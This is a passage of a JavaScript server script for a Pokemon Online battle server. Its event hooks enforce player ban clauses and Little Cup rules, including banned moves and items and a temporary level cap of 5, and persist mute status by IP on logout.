beforeChallengeIssued : function (src, dest, clauses) {
        /* Challenge Cup Clause */
        if (clauses[7] == 1)
                return;
 
        if (clauseOn[dest] == true) {
                for (var i = 0; i < 6; i++) {
                        if (hasBan(dest, sys.teamPoke(src,i))) {
                                sys.sendMessage(src, "ClauseBot: Your opponent is afraid of " + sys.pokemon(sys.teamPoke(src,i)));
                                sys.stopEvent();
                                return;
                        }
                }
        }
        if (clauseOn[src] == true) {
                for (var i = 0; i < 6; i++) {
                        if (hasBan(src, sys.teamPoke(dest,i))) {
                                sys.sendMessage(src, "ClauseBot: You are afraid of some pokemon of the opponent, so I won't let you challenge them.");
                                sys.stopEvent();
                                return;
                        }
                }
        }
 
        /* Regular tier checks that can't be made using the built-in server tier system */
        if (sys.tier(src) == "LittleCup" && sys.tier(dest) == "LittleCup") {
                if (sys.hasTeamMove(src, sys.moveNum("SonicBoom")) || sys.hasTeamMove(src, sys.moveNum("Dragon Rage"))) {
                        sys.sendMessage(src, "+Bot: SonicBoom and Dragon Rage are banned in Little Cup!");
                        sys.stopEvent();
                }
                if (sys.hasTeamMove(dest, sys.moveNum("SonicBoom")) || sys.hasTeamMove(dest, sys.moveNum("Dragon Rage"))) {
                        sys.sendMessage(src, "+Bot: Your opponent has banned moves SonicBoom or Dragon Rage in Little Cup tier!");
                        sys.stopEvent();
                }
                if (sys.hasTeamItem(src, sys.itemNum("Berry Juice"))) {
                        sys.sendMessage(src, "+Bot: Berry Juice is banned in Little Cup!");
                        sys.stopEvent();
                }
                if (sys.hasTeamItem(dest, sys.itemNum("Berry Juice"))) {
                        sys.sendMessage(src, "+Bot: Berry Juice is banned in Little Cup and your opponent has it!");
                        sys.stopEvent();
                }
        }
}
 
,
 
beforeBattleMatchup : function(src,dest,clauses)
{
        if (clauseOn[dest] == true) {
                for (var i = 0; i < 6; i++) {
                        if (hasBan(dest, sys.teamPoke(src,i))) {
                                sys.stopEvent();
                                return;
                        }
                }
        }
        if (clauseOn[src] == true) {
                for (var i = 0; i < 6; i++) {
                        if (hasBan(src, sys.teamPoke(dest,i))) {
                                sys.stopEvent();
                                return;
                        }
                }
        }
 
/* Regular tier checks that can't be made using the built-in server tier system */
        if (sys.tier(src) == "LittleCup" && sys.tier(dest) == "LittleCup") {
                if (sys.hasTeamMove(src, sys.moveNum("SonicBoom")) || sys.hasTeamMove(src, sys.moveNum("Dragon Rage"))) {
                        sys.stopEvent();
                }
                if (sys.hasTeamMove(dest, sys.moveNum("SonicBoom")) || sys.hasTeamMove(dest, sys.moveNum("Dragon Rage"))) {
                        sys.stopEvent();
                }
                if (sys.hasTeamItem(src, sys.itemNum("Berry Juice"))) {
                        sys.stopEvent();
                }
                if (sys.hasTeamItem(dest, sys.itemNum("Berry Juice"))) {
                        sys.stopEvent();
                }
        }
}
 
,
 
beforeBattleStarted : function(src, dest) {
        /* If this is little cup, the levels are changed to be level 5 */
        if (sys.tier(src) == "LittleCup" && sys.tier(dest) == "LittleCup") {
                lilCupLevels[src] = [sys.teamPokeLevel(src, 0), sys.teamPokeLevel(src, 1), sys.teamPokeLevel(src, 2), sys.teamPokeLevel(src, 3), sys.teamPokeLevel(src, 4), sys.teamPokeLevel(src, 5)];
                lilCupLevels[dest] = [sys.teamPokeLevel(dest, 0), sys.teamPokeLevel(dest, 1), sys.teamPokeLevel(dest, 2), sys.teamPokeLevel(dest, 3), sys.teamPokeLevel(dest, 4), sys.teamPokeLevel(dest, 5)];
                for (var i = 0; i < 6; i+=1) {
                        if (sys.teamPokeLevel(src, i) > 5)
                                sys.changePokeLevel(src, i, 5);
                        if (sys.teamPokeLevel(dest, i) > 5)
                                sys.changePokeLevel(dest, i, 5);
                }
        }
}
 
,
 
afterBattleEnded: function(src, dest) {
        /* If this is little cup, the levels are to be changed back! */
        if (sys.tier(src) == "LittleCup" && sys.tier(dest) == "LittleCup" && lilCupLevels[src] != undefined && lilCupLevels[dest] != undefined) {
                for (var i = 0; i < 6; i+=1) {
                        if (sys.teamPokeLevel(src, i) != lilCupLevels[src][i])
                                sys.changePokeLevel(src, i, lilCupLevels[src][i]);
                        if (sys.teamPokeLevel(dest, i) != lilCupLevels[dest][i])
                                sys.changePokeLevel(dest, i, lilCupLevels[dest][i]);
                }
        }
}
 
,
 
beforeLogOut : function (src) {
        if (muted[src] == true) {
                sys.saveVal("muted*" + sys.ip(src), "true");
        } else {
                sys.removeVal("muted*" + sys.ip(src));
        }
}
 
})
